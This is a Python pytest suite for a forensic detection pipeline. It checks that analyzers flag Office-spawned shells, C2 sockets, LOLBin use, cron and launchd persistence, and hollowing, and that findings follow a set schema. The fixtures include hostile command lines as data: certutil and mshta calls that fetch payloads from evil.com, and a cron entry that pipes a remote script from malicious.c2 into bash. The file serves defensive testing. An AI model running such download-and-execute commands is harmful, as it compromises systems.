"""
Phase 4: Safe Advanced Technique Analysis Test Suite.

Verifies:
1. Process Analysis Module (parent-child shell spawning, orphaned processes).
2. Network Analysis Module (outbound C2 backdoor sockets, high-fanout lateral scanning).
3. Execution Analysis Module (volatile temporary path execution, LOLBin argument patterns).
4. Persistence/Artifact Analysis Module (Windows autoruns, Linux cron/systemd, macOS launchd, timestomping, vault tamper).
5. Memory & Security-Context Module (unmapped binary execution, memory footprint anomalies, privilege elevation disparity).
6. Mandatory Finding Schema Validation:
   - finding_id
   - case_id
   - device_id
   - technique
   - evidence_ids
   - timestamp
   - observed_indicator
   - explanation
   - confidence
   - status
7. Safety Invariants:
   - Strictly passive read-only evidence analysis.
   - Zero offensive execution or system alteration.
"""

import pytest
from backend.app.analysis.analyzers import (
    AdvancedAnalysisPipeline,
    ExecutionAnalyzer,
    MemoryAnalyzer,
    NetworkAnalyzer,
    PersistenceAnalyzer,
    ProcessAnalyzer,
)
from backend.app.analysis.mapping import (
    EvidenceTechniqueMapper,
    ForensicContext,
    ObservableIndicator,
    TechniqueFinding,
    analyze_evidence_techniques,
)


@pytest.fixture
def base_context():
    return ForensicContext(
        case_id="CASE-PHASE4-TEST",
        execution_id="EXEC-PHASE4-01",
        device_id="DEV-AGENT-007",
        target_host="FINANCE-PC01",
        evidence_ids={
            "processes": "EVID-PROC-999",
            "network": "EVID-NET-999",
            "windows_metadata": "EVID-WM-999",
            "files": "EVID-FILE-999",
            "linux_persistence": "EVID-LINUX-999",
            "macos_persistence": "EVID-MAC-999",
        },
    )


# ── 1. Process Analysis Tests ────────────────────────────────────────────────

def test_process_analyzer_detects_office_shell_spawn(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 100,
                    "ppid": 50,
                    "name": "winword.exe",
                    "exe": r"C:\Program Files\Office\winword.exe",
                    "create_time": "2026-09-27T12:00:00Z",
                },
                {
                    "pid": 200,
                    "ppid": 100,
                    "name": "powershell.exe",
                    "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "cmdline": ["powershell.exe", "-nop", "-enc", "AAA="],
                    "create_time": "2026-09-27T12:00:05Z",
                },
            ]
        }
    }
    analyzer = ProcessAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) >= 1
    spawn_ind = next(ind for ind in indicators if ind.indicator_id == "IND-PROC-SPAWN-200")
    assert spawn_ind.indicator_type == "ancestry_anomaly"
    assert "winword.exe" in spawn_ind.description
    assert spawn_ind.evidence_id == "EVID-PROC-999"


def test_process_analyzer_detects_orphaned_shell(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 555,
                    "ppid": 9999,  # Parent not in process table
                    "name": "cmd.exe",
                    "exe": r"C:\Windows\System32\cmd.exe",
                    "cmdline": ["cmd.exe"],
                    "create_time": "2026-09-27T12:01:00Z",
                }
            ]
        }
    }
    analyzer = ProcessAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert any(ind.indicator_id == "IND-ORPHAN-555" for ind in indicators)


# ── 2. Network Analysis Tests ────────────────────────────────────────────────

def test_network_analyzer_detects_c2_backdoor_socket(base_context):
    evidence = {
        "network": {
            "connections": [
                {
                    "pid": 777,
                    "protocol": "TCP",
                    "status": "ESTABLISHED",
                    "laddr": {"ip": "192.168.1.50", "port": 49210},
                    "raddr": {"ip": "198.51.100.4", "port": 4444},
                    "timestamp": "2026-09-27T12:05:00Z",
                }
            ]
        }
    }
    analyzer = NetworkAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    c2_ind = indicators[0]
    assert c2_ind.indicator_type == "socket_anomaly"
    assert "4444" in c2_ind.description
    assert c2_ind.evidence_id == "EVID-NET-999"


def test_network_analyzer_detects_lateral_recon_scanning(base_context):
    # Process contacting 12 distinct remote IPs
    connections = [
        {
            "pid": 888,
            "protocol": "TCP",
            "status": "SYN_SENT",
            "laddr": {"ip": "192.168.1.50", "port": 50000 + i},
            "raddr": {"ip": f"10.0.1.{i}", "port": 445},
            "timestamp": "2026-09-27T12:06:00Z",
        }
        for i in range(1, 13)
    ]
    evidence = {"network": {"connections": connections}}
    analyzer = NetworkAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert any(ind.indicator_type == "lateral_movement_anomaly" for ind in indicators)


# ── 3. Execution Analysis Tests ──────────────────────────────────────────────

def test_execution_analyzer_detects_temp_directory_exec(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 1111,
                    "name": "updater.exe",
                    "exe": r"C:\Users\Analyst\AppData\Local\Temp\updater.exe",
                    "create_time": "2026-09-27T12:10:00Z",
                }
            ]
        }
    }
    analyzer = ExecutionAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    assert indicators[0].indicator_type == "path_anomaly"
    assert "updater.exe" in indicators[0].description


def test_execution_analyzer_detects_lolbins_usage(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 2222,
                    "name": "certutil.exe",
                    "exe": r"C:\Windows\System32\certutil.exe",
                    "cmdline": ["certutil.exe", "-urlcache", "-split", "-f", "http://evil.com/payload.dll"],
                    "create_time": "2026-09-27T12:12:00Z",
                },
                {
                    "pid": 2223,
                    "name": "mshta.exe",
                    "exe": r"C:\Windows\System32\mshta.exe",
                    "cmdline": ["mshta.exe", "http://evil.com/script.hta"],
                    "create_time": "2026-09-27T12:12:05Z",
                },
            ]
        }
    }
    analyzer = ExecutionAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    cmd_indicators = [ind for ind in indicators if ind.indicator_type == "command_anomaly"]
    assert len(cmd_indicators) == 2


# ── 4. Persistence Analysis Tests ────────────────────────────────────────────

def test_persistence_analyzer_detects_macos_launchd(base_context):
    evidence = {
        "macos_persistence": {
            "launch_daemons": [
                {
                    "name": "com.suspicious.backdoor",
                    "program": "/private/tmp/backdoor.sh",
                    "program_arguments": ["/private/tmp/backdoor.sh"],
                }
            ]
        }
    }
    analyzer = PersistenceAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    assert indicators[0].indicator_type == "persistence_anomaly"
    assert "com.suspicious.backdoor" in indicators[0].description


def test_persistence_analyzer_detects_linux_cron(base_context):
    evidence = {
        "linux_persistence": {
            "crontabs": [
                {
                    "line_number": 5,
                    "command": "* * * * * curl http://malicious.c2/beacon.sh | bash",
                }
            ]
        }
    }
    analyzer = PersistenceAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    assert indicators[0].indicator_type == "persistence_anomaly"


# ── 5. Memory & Security-Context Analysis Tests ──────────────────────────────

def test_memory_analyzer_detects_unmapped_hollowing(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 4444,
                    "name": "ghost_process.exe",
                    "exe": None,  # Running with no on-disk binary
                    "create_time": "2026-09-27T12:15:00Z",
                    "username": "CORP\\Target",
                }
            ]
        }
    }
    analyzer = MemoryAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    assert indicators[0].indicator_type == "binary_anomaly"
    assert "in-memory execution / hollowing" in indicators[0].description


def test_memory_analyzer_detects_shell_memory_footprint_anomaly(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 5555,
                    "name": "powershell.exe",
                    "exe": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
                    "memory_info": {"rss": 650 * 1024 * 1024},  # 650 MB RSS
                    "create_time": "2026-09-27T12:16:00Z",
                }
            ]
        }
    }
    analyzer = MemoryAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    assert len(indicators) == 1
    assert indicators[0].indicator_type == "memory_footprint_anomaly"
    assert "650" in indicators[0].description


def test_memory_analyzer_detects_privilege_elevation_disparity(base_context):
    evidence = {
        "processes": {
            "processes": [
                {
                    "pid": 1000,
                    "ppid": 100,
                    "name": "explorer.exe",
                    "username": "CORP\\StandardUser",
                },
                {
                    "pid": 1001,
                    "ppid": 1000,
                    "name": "spawnhost.exe",
                    "username": "NT AUTHORITY\\SYSTEM",
                },
            ]
        }
    }
    analyzer = MemoryAnalyzer()
    indicators = analyzer.analyze(evidence, base_context)
    priv_ind = next(ind for ind in indicators if ind.indicator_type == "privilege_disparity")
    assert "CORP\\StandardUser" in priv_ind.description


# ── 6. Full Pipeline & Required Finding Schema Fields ─────────────────────────

def test_pipeline_synthesizes_all_required_finding_fields(base_context):
    """
    Validates that every TechniqueFinding generated includes all required fields:
    - finding_id
    - case_id
    - device_id
    - technique
    - evidence_ids
    - timestamp
    - observed_indicator
    - explanation
    - confidence / status
    """
    evidence = {
        "case_id": base_context.case_id,
        "execution_id": base_context.execution_id,
        "device_id": base_context.device_id,
        "evidence_ids": base_context.evidence_ids,
        "processes": {
            "processes": [
                {
                    "pid": 3001,
                    "ppid": 500,
                    "name": "payload.exe",
                    "exe": r"C:\Windows\Temp\payload.exe",
                    "create_time": "2026-09-27T12:20:00Z",
                }
            ]
        },
        "network": {
            "connections": [
                {
                    "pid": 3001,
                    "protocol": "TCP",
                    "status": "ESTABLISHED",
                    "raddr": {"ip": "203.0.113.10", "port": 4444},
                    "timestamp": "2026-09-27T12:20:05Z",
                }
            ]
        },
    }

    pipeline = AdvancedAnalysisPipeline()
    findings = pipeline.analyze(evidence, base_context)

    assert len(findings) >= 2

    for f in findings:
        # 1. finding_id
        assert isinstance(f.finding_id, str) and f.finding_id.startswith("FIND-")

        # 2. case_id
        assert f.case_id == "CASE-PHASE4-TEST"

        # 3. device_id
        assert f.device_id == "DEV-AGENT-007"

        # 4. technique (must be string identifier or dictionary)
        assert f.technique in ("TECH-TMP-EXEC", "TECH-NET-BACKDOOR")
        assert f.technique_id in ("TECH-TMP-EXEC", "TECH-NET-BACKDOOR")
        assert len(f.technique_name) > 0

        # 5. evidence_ids
        assert isinstance(f.evidence_ids, list)
        assert len(f.evidence_ids) > 0

        # 6. timestamp
        assert isinstance(f.timestamp, str) and len(f.timestamp) > 0

        # 7. observed_indicator
        assert isinstance(f.observed_indicator, str) and len(f.observed_indicator) > 0

        # 8. explanation
        assert isinstance(f.explanation, str) and len(f.explanation) > 0

        # 9. confidence and status
        assert f.confidence in ("HIGH", "MEDIUM", "LOW")
        assert f.status in ("DETECTED", "CONFIRMED", "SUSPICIOUS")


def test_analyze_evidence_techniques_integration():
    """Validates global analyze_evidence_techniques helper function."""
    evidence = {
        "case_id": "CASE-HELPER-01",
        "device_id": "DEV-HELPER-01",
        "processes": {
            "processes": [
                {
                    "pid": 9001,
                    "name": "malware.exe",
                    "exe": r"C:\Windows\Temp\malware.exe",
                    "create_time": "2026-09-27T12:30:00Z",
                }
            ]
        },
    }
    findings = analyze_evidence_techniques(evidence)
    assert len(findings) == 1
    finding = findings[0]
    assert finding["case_id"] == "CASE-HELPER-01"
    assert finding["device_id"] == "DEV-HELPER-01"
    assert finding["technique"] == "TECH-TMP-EXEC"
    assert finding["status"] == "DETECTED"
    assert finding["confidence"] in ("HIGH", "MEDIUM", "LOW")
    assert len(finding["observed_indicator"]) > 0
    assert len(finding["explanation"]) > 0
